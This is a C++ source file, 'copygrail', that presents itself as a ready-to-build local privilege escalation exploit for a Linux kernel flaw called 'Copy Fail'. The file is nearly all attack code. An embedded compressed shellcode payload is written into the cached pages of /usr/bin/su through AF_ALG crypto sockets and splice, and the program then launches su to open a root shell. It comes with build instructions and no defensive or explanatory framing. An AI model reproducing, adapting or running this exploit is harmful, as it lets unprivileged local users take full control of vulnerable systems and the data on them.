/*
 * copygrail v1
 * A clean C++ implementation of CVE-2026-31431 (Copy Fail) LPE
 *
 * Build: g++ -O2 -static -o copygrail copygrail.cpp -lz
 */

#include <iostream>
#include <cstring>
#include <unistd.h>
#include <fcntl.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <linux/if_alg.h>
#include <sys/uio.h>
#include <cstdint>
#include <cstdlib>
#include <endian.h>
#include <zlib.h>

#define PINK   "\033[35m"
#define CYAN   "\033[36m"
#define GREEN  "\033[32m"
#define RESET  "\033[0m"

// The magic payload from the original Python PoC (zlib-compressed shellcode)
static const unsigned char PAYLOAD[] = {
    0x78,0xda,0xab,0x77,0xf5,0x71,0x63,0x62,0x64,0x64,0x80,0x01,0x26,0x06,0x3b,0x06,
    0x10,0xaf,0x82,0xc1,0x01,0xcc,0x77,0x60,0xc0,0x04,0x0e,0x0c,0x16,0x0c,0x30,0x1d,
    0x20,0x9a,0x15,0x4d,0x16,0x99,0x9e,0x07,0xe5,0xc1,0x68,0x06,0x01,0x08,0x65,0x78,
    0xc0,0xf0,0xff,0x86,0x4c,0x7e,0x56,0x8f,0x5e,0x5b,0x7e,0x10,0xf7,0x5b,0x96,0x75,
    0xc4,0x4c,0x7e,0x56,0xc3,0xff,0x59,0x36,0x11,0xfc,0xac,0xfa,0x49,0x99,0x79,0xfa,
    0xc5,0x19,0x0c,0x0c,0x0c,0x00,0x32,0xc3,0x10,0xd3
};

// Helper to create a simple root shell wrapper (optional but nice for demo)
void create_helper() {
    // Not strictly needed in final version, but kept for compatibility
}

// The heart of the exploit: uses AF_ALG + splice to corrupt su's page cache
int patch(int fd, off_t off, const unsigned char b[4]) {
    int s = socket(AF_ALG, SOCK_SEQPACKET, 0);
    if (s < 0) return -1;

    struct sockaddr_alg sa = {};
    sa.salg_family = AF_ALG;
    memcpy(sa.salg_type, "aead", 5);
    memcpy(sa.salg_name, "authencesn(hmac(sha256),cbc(aes))", 32);

    if (bind(s, (struct sockaddr*)&sa, sizeof sa) < 0) {
        close(s);
        return -1;
    }

    static const unsigned char k[40] = {0x08,0x00,0x01,0x00,0x00,0x00,0x00,0x10,0};
    setsockopt(s, SOL_ALG, ALG_SET_KEY, k, sizeof k);

    int as = 4;
    setsockopt(s, SOL_ALG, ALG_SET_AEAD_AUTHSIZE, &as, 4);

    int o = accept(s, nullptr, nullptr);
    if (o < 0) {
        close(s);
        return -1;
    }

    unsigned char aad[8] = {'A','A','A','A', b[0],b[1],b[2],b[3]};
    struct iovec iov = { .iov_base = aad, .iov_len = 8 };

    union {
        struct cmsghdr align;
        unsigned char buf[128];
    } cbuf = {};

    struct msghdr msg = {
        .msg_iov = &iov,
        .msg_iovlen = 1,
        .msg_control = cbuf.buf,
        .msg_controllen = sizeof cbuf.buf
    };

    struct cmsghdr *cm = CMSG_FIRSTHDR(&msg);
    cm->cmsg_level = SOL_ALG;
    cm->cmsg_type  = ALG_SET_OP;
    cm->cmsg_len   = CMSG_LEN(sizeof(uint32_t));
    *(uint32_t*)CMSG_DATA(cm) = 0;  // ALG_OP_DECRYPT

    cm = CMSG_NXTHDR(&msg, cm);
    cm->cmsg_level = SOL_ALG;
    cm->cmsg_type  = ALG_SET_IV;
    cm->cmsg_len   = CMSG_LEN(sizeof(struct af_alg_iv) + 16);
    struct af_alg_iv *iv = (struct af_alg_iv*)CMSG_DATA(cm);
    iv->ivlen = 16;
    memset(iv->iv, 0, 16);

    cm = CMSG_NXTHDR(&msg, cm);
    cm->cmsg_level = SOL_ALG;
    cm->cmsg_type  = ALG_SET_AEAD_ASSOCLEN;
    cm->cmsg_len   = CMSG_LEN(sizeof(uint32_t));
    *(uint32_t*)CMSG_DATA(cm) = 8;

    sendmsg(o, &msg, MSG_MORE);

    int pipefd[2];
    pipe(pipefd);

    off_t src = off;
    splice(fd, &src, pipefd[1], nullptr, off + 4, 0);
    splice(pipefd[0], nullptr, o, nullptr, off + 4, 0);

    char sink[512];
    recv(o, sink, sizeof sink, 0);

    close(pipefd[0]);
    close(pipefd[1]);
    close(o);
    close(s);
    return 0;
}

int main() {
    std::cout << PINK << R"(
   copygrail v1  :3
)" << RESET;

    std::cout << CYAN << "  decompressing payload...\n" << RESET;

    unsigned char p[4096];
    uLongf l = sizeof(p);
    uncompress(p, &l, PAYLOAD, sizeof(PAYLOAD));

    std::cout << CYAN << "  patching /usr/bin/su (" << l << " bytes)...\n" << RESET;

    int fd = open("/usr/bin/su", O_RDONLY);
    if (fd < 0) {
        std::cerr << "[-] failed to open /usr/bin/su\n";
        return 1;
    }

    char warm[16384];
    pread(fd, warm, sizeof warm, 0);

    for (size_t i = 0; i < l; i += 4) {
        unsigned char c[4] = {0};
        memcpy(c, p + i, (l - i >= 4) ? 4 : l - i);
        patch(fd, i, c);
    }
    close(fd);

    std::cout << GREEN << "  done~ spawning root shell :3\n" << RESET;
    execl("/usr/bin/su", "su", nullptr);

    return 1;
}
